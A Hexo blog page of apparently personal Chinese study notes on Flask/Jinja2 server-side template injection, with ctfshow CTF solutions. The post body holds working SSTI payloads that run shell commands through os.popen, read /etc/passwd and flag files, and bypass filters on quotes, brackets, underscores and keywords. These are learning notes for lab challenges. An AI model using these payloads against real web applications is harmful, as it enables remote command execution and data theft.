@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="# SSTI  能够利用来任意文件读取,rce  成因:渲染模板没有严格控制对用户的输入  配合eval,system.popen,file进行任意文件读取  # 测试方法  参考博客:[Smarty模板注入&amp;CVE-2017-1000480](https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;12220)  参数&#x3D;{{10*10}}  ![image](&#x2F;yuque-notes&#x2F;02-Knowl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI">
+<meta property="og:url" content="http://example.com/2026/09/16/54-SSTI/index.html">
+<meta property="og:site_name" content="Glut4micum">
+<meta property="og:description" content="# SSTI  能够利用来任意文件读取,rce  成因:渲染模板没有严格控制对用户的输入  配合eval,system.popen,file进行任意文件读取  # 测试方法  参考博客:[Smarty模板注入&amp;CVE-2017-1000480](https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;12220)  参数&#x3D;{{10*10}}  ![image](&#x2F;yuque-notes&#x2F;02-Knowl">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-09-16T14:21:16.000Z">
+<meta property="article:modified_time" content="2026-09-16T14:21:16.000Z">
+<meta property="article:author" content="谷氨酸棒状杆菌">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2026/09/16/54-SSTI/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SSTI | Glut4micum</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Glut4micum</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/09/16/54-SSTI/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://ice.frostsky.com/2024/03/16/1776051b6463e644bf0eb40aed808727.md.jpeg">
+      <meta itemprop="name" content="谷氨酸棒状杆菌">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glut4micum">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SSTI
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-09-16 22:21:16" itemprop="dateCreated datePublished" datetime="2026-09-16T22:21:16+08:00">2026-09-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">知识笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="本文总阅读两 fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        
+# SSTI
+
+能够利用来任意文件读取,rce
+
+成因:渲染模板没有严格控制对用户的输入
+
+配合eval,system.popen,file进行任意文件读取
+
+# 测试方法
+
+参考博客:[Smarty模板注入&CVE-2017-1000480](https://xz.aliyun.com/t/12220)
+
+参数={{10*10}}
+
+![image](/yuque-notes/02-Knowledge Book/assets/25f4cb98-1344396-20200911174631687-758048107.png)
+
+# vene
+
+用来存放python脚本,以及安装python第三方库,换=环境和本机分离开,类似于一个虚拟机的环境
+
+# flask
+
+轻量级的web框架
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *<span class="comment">#加载模块</span></span><br><span class="line">app = Flask(__name__)<span class="comment">#即文件名</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span><span class="comment">#查找对应页面,路由,理解为标签页</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    retrn<span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:<span class="comment">#确保只在当前程序运行,别的程序无法调用</span></span><br><span class="line">	app.run()</span><br></pre></td></tr></table></figure>
+
+默认监听127.0.0.1:5000端口
+
+- debug=True 动态执行代码,可以进行覆盖操作,也能定位到错误,在低版本能够直接在报错的地方输入python代码,引起命令执行漏洞,现在一半需要输入pin码才能执行
+- host='0.0.0.0' 监听所有端口,不需要通过主机访问,别人也能打开
+- port=端口号
+
+## url传参,格式化字符串
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *<span class="comment">#加载模块</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span><span class="comment">#&lt;int:ID&gt;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span>(<span class="string">&#x27;hello %s&#x27;</span>)%name<span class="comment">#%s,格式化字符串,如果是%d那么就是只接入整数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/6d77e400-image.png)
+
+## HTTP传参方法
+
+app.py读取文件是需要在另一个与本文件夹同级的文件夹下的同名文件,才能读取(templates)
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *  <span class="comment"># 加载模块</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/aaa/&lt;name&gt;&#x27;</span></span>)  </span><span class="comment"># &lt;int:ID&gt;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aaa</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = request.form[<span class="string">&#x27;hello&#x27;</span>]<span class="comment">#POST</span></span><br><span class="line">        <span class="comment">#GET:request.args.get</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;aaa&#x27;</span>, name=name))</span><br><span class="line">        <span class="comment">#重定向跳转到aaa路由</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/eb2238ab-image.png)
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/82021ae9-image.png)
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/acf5922d-image.png)
+
+# 函数
+
+## render_template
+
+加载html文件,默认在emplates文件夹
+
+## render_template_string
+
+用于渲染字符串
+
+# python
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象（类）</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line"><span class="comment">// __base__和__mro__都是用来寻找基类的</span></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/76ab7304-image.png)
+
+# 检查可用的函数
+
+`self.__dict__._TemplateReference__context.keys()`
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/d5fe466b-image.png)
+
+### lipsum,url_for,get_flashed_messages都有os模块
+
+# 继承关系和魔术方法
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/b60ceefe-image.png)
+
+## __base__
+
+往上查找父类
+
+## __mro__
+
+把所有的类都显示出来,根据下标序号取得目标类,罗列出所有父类关系
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/fac3f1e7-image.png)
+
+## __subclasses__()
+
+查看子类
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/47549e0e-image.png)
+
+## __class__
+
+读取当前类所属的对象
+
+前面加上的(),'',[],"",{}等,类似于通配符,查找类型
+
+## __init__
+
+查看类是否重载,如果出现wrapper,说明没有重载,无法执行
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/b8e85d6b-image.png)
+
+已经重载
+
+## __globals__()
+
+只有被重载了,才有__globals__
+
+以字典的形式返回当前对象的全局变量,即显示所有加载好的函数方法
+
+## __builtins__
+
+加载内嵌函数和方法
+
+?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls')").read()"}}
+
+## .read()
+
+显示回显
+
+## ()|join
+
+()|join方法，可以将小括号里的内容进行拼接起来。例如：(1,2,3)|join 就可以打印出123。
+
+## dict()|join
+
+而dict()|join，就是将该字典的key值进行拼接，例如：dict(a=1,b=2)|join 的输出结果就是ab
+
+# 常用模块
+
+### os._wrap_close
+
+### _frozen_importlib_external.FileFinder
+
+对服务器上的某些文件进行读取
+
+["get_data"](0,"/etc/passwd")
+
+## importlib类
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/977a2e3f-image.png)
+
+## os模块
+
+## linecache
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/d68bfed5-image.png)
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/c5714814-image.png)
+
+## subprocess.Popen类
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/162fdfaf-image.png)
+
+# 过滤绕过
+
+## 大括号被禁
+
+{{}}={%%}
+
+## SSTI无回显盲注
+
+反弹shell,外带
+
+## 中括号过滤
+
+__getitem__(数字或键名),通过键名得到键值,等于中括号的内容
+
+## 单双引号过滤
+
+### GET
+
+request.value.变量名
+
+request.args.变量名, 通过get传入变量即可绕过单双引号,语句变量用&
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/e36cd92b-image.png)
+
+`payload:?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.aaa](request.args.bbb).read()}}&aaa=popen&bbb=ls /`
+
+### POST
+
+request.form.变量名 POST方法
+
+### Cookie
+
+request.cookies.变量名 cookie方法,变量用;隔开
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/19f91661-image.png)
+
+`?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.cookies.aaa](request.cookies.bbb).read()}}`
+
+## 下划线过滤
+
+attr过滤器,使用request方法
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/352c4c14-image.png)
+
+`?name={{''|attr(request.args.class)|attr(request.args.base)}}
+
+再用get传参class=__class__&base=__base__
+
+## 关键字过滤
+
+### 字符编码
+
+### 拼接过滤
+
+__class__="__cl"+"ass__"
+
+### ~拼接
+
+`{%set a="__cla"%}{%set b="ss__"%}{{a~b}}`
+
+### reverse反转,replace替换,join拼接
+
+`{%set a="__ssalc__"|reverse%}{{a}}`
+
+### char()
+
+## length过滤数字
+
+{%set a='aaaaaaaaaa'|length%}{{a}}
+
+a即等于10
+
+{%set a='aaaaaaaaaa'|length*"aaa"|length%}{{a}}
+
+a等于30
+
+## 全角数字转半羊角
+
+脚本
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">half2full</span>(<span class="params">half</span>):</span><br><span class="line">    full = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> half:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(ch) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="built_in">ord</span>(ch) + <span class="number">0xfee0</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(ch) == <span class="number">32</span>:</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="number">0x3000</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        full += ch</span><br><span class="line">    <span class="keyword">return</span> full</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&quot;输入想要转换的数字字符串：&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        t += half2full(i)</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>
+
+## config文件获取
+
+current_app
+
+{{url_for.__globals__['current_app'].config}}调取当前框架的config即flask的
+
+{{get_flashed_messages.__globals__['current_app'].config}}
+
+# ctfshow
+
+## 361
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/7ec32e80-image.png)
+
+payload: ?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
+
+或者利用内置函数
+
+`?name={{lipsum.__globals__.os.popen('ls /').read()}}`
+
+## 362
+
+内置函数绕过
+
+`?`
+
+## 363
+
+单双引号绕过
+
+`?name={{lipsum.__globals__.os.popen(request.args.aaa).read()}}&aaa=ls /`
+
+## 364
+
+过滤了args,使用cookie
+
+`?name={{lipsum.__globals__.os.popen(request.cookies.aaa).read()}}`
+
+## 365
+
+过滤了[],上一题payload仍旧有效
+
+`?name={{().__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.cookies.aaa)(request.cookies.bbb).read()}}`,用__getitem__()替换[]
+
+## 366
+
+过滤了下划线
+
+`?name={{(lipsum | attr(request.values.b)).os.popen(request.values.a).read()}}&a=cat /flag&b=__globals__`
+
+使用attr过滤器和管道符
+
+## 337
+
+过滤了os,
+
+`?name={{(lipsum | attr(request.values.b)).get(request.values.c).popen(request.values.a).read()}}&a=cat /flag&b=__globals__&c=os`
+
+## 368~369
+
+`?name=
+{% set a=(()|select|string|list).pop(24) %} // a = _
+{% set globals=(a,a,dict(globals=1)|join,a,a)|join %} // globals=__globals__
+{% set init=(a,a,dict(init=1)|join,a,a)|join %}
+{% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %}
+{% set a=(lipsum|attr(globals)).get(builtins) %}
+{% set chr=a.chr %}
+{% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %}`
+
+~可以替换为%2b
+
+`name={% set po=dict(po=a,p=b)|join%}
+{% set a=(()|select|string|list)|attr(po)(24)%}
+{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}
+{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}
+{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}
+{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}
+{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}
+{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}
+{%set pp=dict(pop=a,en=b)|join %}
+{%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(132)|attr(ini)|attr(glo)|attr(geti)(pp)(‘tac /flag’)|attr(‘read’)() )%}`
+
+# 工具使用
+
+[https://github.com/Marven11/Fenjing](https://github.com/Marven11/Fenjing)
+
+一体化集成,一步到位
+
+---
+
+来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/zc1i6lphb4b005im
+语雀文档ID: 141967193
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/09/16/53-%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="prev" title="数据库">
+      <i class="fa fa-chevron-left"></i> 数据库
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/09/16/55-SQL%E6%B3%A8%E5%85%A5/" rel="next" title="SQL注入">
+      SQL注入 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="谷氨酸棒状杆菌"
+      src="https://ice.frostsky.com/2024/03/16/1776051b6463e644bf0eb40aed808727.md.jpeg">
+  <p class="site-author-name" itemprop="name">谷氨酸棒状杆菌</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Glut4micum" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Glut4micum" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">谷氨酸棒状杆菌</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="总访客量 fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="总阅读量 fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
